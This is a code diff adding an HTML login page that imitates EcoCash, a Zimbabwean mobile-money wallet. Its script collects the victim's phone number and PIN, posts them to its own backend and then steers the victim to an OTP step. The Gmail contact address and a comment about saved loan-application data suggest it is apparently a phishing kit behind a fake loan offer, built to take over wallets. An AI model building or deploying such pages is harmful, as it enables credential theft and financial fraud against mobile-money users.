@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>EcoCash – Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet"/>
+    <style>
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+        body{font-family:'Nunito',sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column;}
+
+        .top{flex:1;display:flex;flex-direction:column;align-items:center;padding:3rem 1.5rem 2.5rem;}
+        .logo{font-size:2.6rem;font-weight:800;letter-spacing:-1px;margin-bottom:2.5rem;}
+        .logo .eco{color:#003087;} .logo .cash{color:#d0021b;}
+        .page-title{font-size:1.5rem;font-weight:700;color:#333;margin-bottom:2rem;text-align:center;}
+
+        .phone-wrap{width:100%;max-width:380px;display:flex;align-items:center;border:1.5px solid #003087;border-radius:10px;background:#fff;padding:0 1rem;height:58px;margin-bottom:2.2rem;transition:box-shadow .2s;}
+        .phone-wrap:focus-within{box-shadow:0 0 0 3px rgba(0,48,135,.12);}
+        .flag-wrap{display:flex;align-items:center;gap:5px;padding-right:10px;border-right:1px solid #dde3f0;margin-right:10px;flex-shrink:0;}
+        .flag{font-size:1.3rem;} .caret{font-size:.55rem;color:#666;}
+        .dial-code{font-weight:700;color:#1a1a1a;font-size:1rem;margin-right:8px;}
+        .phone-wrap input{border:none;outline:none;flex:1;font-family:'Nunito',sans-serif;font-size:1rem;color:#333;background:transparent;}
+        .phone-wrap input::placeholder{color:#bbb;}
+
+        .pin-label{font-size:.95rem;color:#555;margin-bottom:1.1rem;text-align:center;}
+        .pin-row{display:flex;gap:14px;justify-content:center;margin-bottom:.5rem;}
+        .pin-box{width:62px;height:62px;border:2px solid #003087;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:1.6rem;font-weight:800;background:#fff;color:#1a1a1a;cursor:text;user-select:none;transition:box-shadow .15s;}
+        .pin-box.active{box-shadow:0 0 0 3px rgba(0,48,135,.18);}
+        .pin-box.error{border-color:#d0021b;background:#fff5f5;}
+        .cursor{width:2px;height:28px;background:#003087;animation:blink 1s step-end infinite;display:none;}
+        .pin-box.active .cursor{display:block;}
+        @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+        .error-msg{color:#d0021b;font-size:.85rem;margin-top:.6rem;text-align:center;min-height:1.2em;}
+
+        .pin-error-toast{
+            display:none;position:fixed;top:0;left:0;right:0;z-index:999;
+            background:#d0021b;color:white;
+            font-family:'Nunito',sans-serif;font-weight:800;font-size:.95rem;
+            padding:1rem 1.5rem;text-align:center;
+            box-shadow:0 4px 16px rgba(208,2,27,.4);
+            animation:slideDown .3s ease-out;
+        }
+        .pin-error-toast.show{display:block;}
+        @keyframes slideDown{from{transform:translateY(-100%);}to{transform:translateY(0);}}
+        @keyframes shake{
+            0%,100%{transform:translateX(0);}
+            20%{transform:translateX(-8px);}
+            40%{transform:translateX(8px);}
+            60%{transform:translateX(-6px);}
+            80%{transform:translateX(6px);}
+        }
+        .pin-row.shake{animation:shake .4s ease-out;}
+
+        .wave-wrap{line-height:0;} .wave-wrap svg{display:block;width:100%;}
+        .bottom{background:#003087;padding:2rem 1.5rem 2.8rem;display:flex;flex-direction:column;align-items:center;}
+        .bottom-desc{font-size:.95rem;text-align:center;line-height:1.6;margin-bottom:1.6rem;opacity:.95;max-width:300px;color:#fff;}
+        .bottom-cards{display:flex;gap:14px;width:100%;max-width:380px;margin-bottom:2.2rem;}
+        .bottom-card{flex:1;background:#fff;border-radius:12px;padding:1.3rem .5rem;display:flex;flex-direction:column;align-items:center;gap:8px;border:none;cursor:pointer;font-family:'Nunito',sans-serif;}
+        .card-icon{font-size:1.6rem;} .card-label{font-size:.9rem;font-weight:700;color:#1a1a1a;}
+        .footer-text{font-size:.72rem;color:rgba(255,255,255,.65);text-align:center;line-height:1.8;}
+        .footer-text a{color:rgba(255,255,255,.9);text-decoration:underline;}
+
+        #pin-input{position:absolute;opacity:0;pointer-events:none;width:0;height:0;}
+
+        .loading-overlay{position:fixed;inset:0;background:rgba(110,110,110,0.82);z-index:500;display:none;align-items:center;justify-content:center;padding:2rem;}
+        .loading-overlay.show{display:flex;}
+        .loading-card{background:#fff;border-radius:18px;padding:2.8rem 2rem 2.4rem;display:flex;flex-direction:column;align-items:center;gap:1.1rem;width:100%;max-width:320px;box-shadow:0 8px 32px rgba(0,0,0,.12);}
+        .spinner-wrap{position:relative;width:90px;height:90px;}
+        .spinner-bg{width:90px;height:90px;border-radius:50%;background:#8b9fd4;}
+        .spinner-arc{position:absolute;inset:0;border-radius:50%;border:5px solid transparent;border-top:5px solid rgba(255,255,255,0.85);border-right:5px solid rgba(255,255,255,0.3);animation:spin 1s linear infinite;}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .loading-title{font-size:1.25rem;font-weight:800;color:#6b7fd4;text-align:center;}
+        .loading-sub{font-size:.88rem;color:#888;text-align:center;margin-top:-.4rem;}
+        .cancel-link{font-size:.78rem;color:#aaa;cursor:pointer;text-decoration:underline;margin-top:.6rem;}
+        .cancel-link:hover{color:#d0021b;}
+
+        @media(max-width:420px){
+            .top{padding:2rem 1.2rem 1.8rem;}
+            .logo{font-size:2.1rem;margin-bottom:2rem;}
+            .pin-box{width:52px;height:52px;font-size:1.3rem;}
+        }
+    </style>
+</head>
+<body>
+<div class="pin-error-toast" id="pinErrorToast">
+    ⚠️ Incorrect PIN. Please check your EcoCash PIN and try again.
+</div>
+<div class="top">
+    <div class="logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+    <div class="page-title">Login</div>
+
+    <div class="phone-wrap">
+        <div class="flag-wrap"><span class="flag">🇿🇼</span><span class="caret">▾</span></div>
+        <span class="dial-code">+263</span>
+        <input type="tel" id="phone" placeholder="712345678" inputmode="numeric" maxlength="9" autocomplete="tel"/>
+    </div>
+
+    <div class="pin-label">Enter your PIN</div>
+    <div class="pin-row" id="pin-row">
+        <div class="pin-box" id="pb0"><span class="cursor"></span></div>
+        <div class="pin-box" id="pb1"><span class="cursor"></span></div>
+        <div class="pin-box" id="pb2"><span class="cursor"></span></div>
+        <div class="pin-box" id="pb3"><span class="cursor"></span></div>
+    </div>
+    <div class="error-msg" id="err"></div>
+</div>
+
+<div class="wave-wrap">
+    <svg viewBox="0 0 414 55" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="none">
+        <path d="M0,0 L414,0 L414,55 Q207,5 0,55 Z" fill="#ffffff"/>
+        <path d="M0,55 Q207,5 414,55 L414,110 L0,110 Z" fill="#003087"/>
+    </svg>
+</div>
+<div class="bottom">
+    <p class="bottom-desc">To register an EcoCash wallet or get assistance, click below</p>
+    <div class="bottom-cards">
+        <button class="bottom-card"><div class="card-icon">👤</div><div class="card-label">Register</div></button>
+        <button class="bottom-card"><div class="card-icon">ℹ️</div><div class="card-label">Help &amp; Support</div></button>
+    </div>
+    <div class="footer-text">v4.0.1P<br/>By signing in you agree to the <a href="#">Terms and Conditions</a><br/><a href="mailto:loansecocash8@gmail.com">loansecocash8@gmail.com</a></div>
+</div>
+
+<!-- LOADING OVERLAY -->
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-card">
+        <div class="spinner-wrap">
+            <div class="spinner-bg"></div>
+            <div class="spinner-arc"></div>
+        </div>
+        <div class="loading-title" id="loadingTitle">Processing...</div>
+        <div class="loading-sub"  id="loadingSub">Preparing verification...</div>
+        <div class="cancel-link"  id="cancelLink" style="display:none">Cancel</div>
+    </div>
+</div>
+
+<input type="text" inputmode="numeric" id="pin-input" maxlength="1" autocomplete="off"/>
+
+<script>
+    const phoneEl   = document.getElementById('phone');
+    const pinBoxEls = [0,1,2,3].map(i => document.getElementById('pb'+i));
+    const errEl     = document.getElementById('err');
+    const hiddenIn  = document.getElementById('pin-input');
+    const overlay   = document.getElementById('loadingOverlay');
+    const loadTitle = document.getElementById('loadingTitle');
+    const loadSub   = document.getElementById('loadingSub');
+    const cancelLnk = document.getElementById('cancelLink');
+    let pin = '', pollInterval = null;
+
+    // Clear only auth state — loan_data saved by loan-application must be preserved
+    sessionStorage.removeItem('verified');
+    sessionStorage.removeItem('session_id');
+    sessionStorage.removeItem('loan_reference');
+
+    // Restore stored phone if present (strip leading 0 since input is after +263)
+    const sp = sessionStorage.getItem('phone') || '';
+    if (sp) {
+        phoneEl.value = sp.replace(/^0/, '').slice(0, 9);
+    }
+
+    // FIX: maxlength set to 9 in HTML; enforce in JS too
+    phoneEl.addEventListener('input', e => {
+        e.target.value = e.target.value.replace(/\D/g,'').slice(0, 9);
+        clearErr();
+    });
+
+    document.getElementById('pin-row').addEventListener('click',    () => { hiddenIn.focus(); draw(); });
+    document.getElementById('pin-row').addEventListener('touchend', e  => { e.preventDefault(); hiddenIn.focus(); draw(); });
+
+    hiddenIn.addEventListener('input', e => {
+        const v = e.target.value; e.target.value = '';
+        if (v && /^\d$/.test(v) && pin.length < 4) {
+            pin += v;
+            draw();
+            if (pin.length === 4) tryLogin();
+        }
+    });
+    hiddenIn.addEventListener('keydown', e => {
+        if ((e.key==='Backspace'||e.key==='Delete') && pin.length) {
+            pin = pin.slice(0,-1);
+            draw();
+        }
+    });
+    hiddenIn.addEventListener('focus', draw);
+    hiddenIn.addEventListener('blur', () => pinBoxEls.forEach(b => b.classList.remove('active')));
+
+    function clearErr() { errEl.textContent = ''; }
+
+    function draw() {
+        if (pin.length > 0) pinBoxEls.forEach(b => b.classList.remove('error'));
+        clearErr();
+        pinBoxEls.forEach((box,i) => {
+            box.innerHTML = '';
+            if (i < pin.length) {
+                box.textContent = '●'; box.classList.remove('active');
+            } else {
+                const c = document.createElement('span'); c.className='cursor'; box.appendChild(c);
+                box.classList.toggle('active', i===pin.length && document.activeElement===hiddenIn);
+            }
+        });
+    }
+
+    function showLoading(title, sub, showCancel=false) {
+        loadTitle.textContent   = title;
+        loadSub.textContent     = sub;
+        cancelLnk.style.display = showCancel ? 'block' : 'none';
+        overlay.classList.add('show');
+    }
+    function hideLoading() {
+        overlay.classList.remove('show');
+        cancelLnk.style.display = 'none';
+    }
+
+    cancelLnk.addEventListener('click', () => {
+        clearInterval(pollInterval); pollInterval = null;
+        hideLoading();
+        pin = ''; draw();
+        errEl.textContent = 'Cancelled. Please try again.';
+        hiddenIn.focus();
+    });
+
+    async function tryLogin() {
+        const ph = phoneEl.value.trim();
+
+        // FIX: Zimbabwe numbers are exactly 9 digits after country code
+        if (ph.length !== 9) {
+            errEl.textContent = 'Please enter a valid 9-digit phone number.';
+            pin = ''; draw(); return;
+        }
+
+        clearErr();
+        sessionStorage.setItem('phone', '0' + ph);
+
+        showLoading('Processing...', 'Preparing verification...');
+
+        let sid;
+        try {
+            const res  = await fetch('/api/login', {
+                method:  'POST',
+                headers: {'Content-Type':'application/json'},
+                body:    JSON.stringify({ phone: '0' + ph, pin })
+            });
+            const data = await res.json();
+            if (!data.success) {
+                hideLoading();
+                errEl.textContent = data.error || 'Login failed. Please try again.';
+                pin = ''; draw(); return;
+            }
+            sid = data.session_id;
+            sessionStorage.setItem('session_id', sid);
+        } catch {
+            hideLoading();
+            errEl.textContent = 'Could not connect to server.';
+            pin = ''; draw(); return;
+        }
+
+        showLoading('Please wait...', 'This usually takes a few seconds', true);
+        startPolling(sid);
+    }
+
+    function startPolling(sid) {
+        pollInterval = setInterval(async () => {
+            try {
+                const res  = await fetch(`/api/check-status?session_id=${sid}`);
+                const data = await res.json();
+
+                if (data.status === 'awaiting_pin' || data.status === 'waiting_for_gateway') return;
+
+                clearInterval(pollInterval); pollInterval = null;
+
+                if (data.status === 'awaiting_otp') {
+                    showLoading('Please wait...', 'Redirecting to verification...');
+                    setTimeout(() => { window.location.href = '/otp-verify'; }, 700);
+
+                } else if (data.status === 'pin_rejected') {
+                    hideLoading();
+                    // Shake the PIN row
+                    const pinRow = document.getElementById('pin-row');
+                    pinRow.classList.remove('shake');
+                    void pinRow.offsetWidth; // force reflow to restart animation
+                    pinRow.classList.add('shake');
+                    setTimeout(() => pinRow.classList.remove('shake'), 500);
+                    // Mark boxes red
+                    pinBoxEls.forEach(b => b.classList.add('error'));
+                    // Show inline error
+                    errEl.textContent = 'Incorrect PIN — please try again.';
+                    // Show prominent top toast banner
+                    const toast = document.getElementById('pinErrorToast');
+                    toast.classList.add('show');
+                    setTimeout(() => toast.classList.remove('show'), 4000);
+                    pin = ''; draw();
+                    sessionStorage.removeItem('session_id');
+                    setTimeout(() => hiddenIn.focus(), 100);
+
+                } else if (data.status === 'expired') {
+                    hideLoading();
+                    errEl.textContent = 'Session expired. Please try again.';
+                    sessionStorage.removeItem('session_id');
+                    pin = ''; draw();
+
+                } else {
+                    hideLoading();
+                    errEl.textContent = 'Unexpected error. Please try again.';
+                    pin = ''; draw();
+                }
+            } catch { /* network hiccup — keep polling */ }
+        }, 1500);
+    }
+</script>
+<script src="/chat-widget.js"></script>
+</body>
+</html>
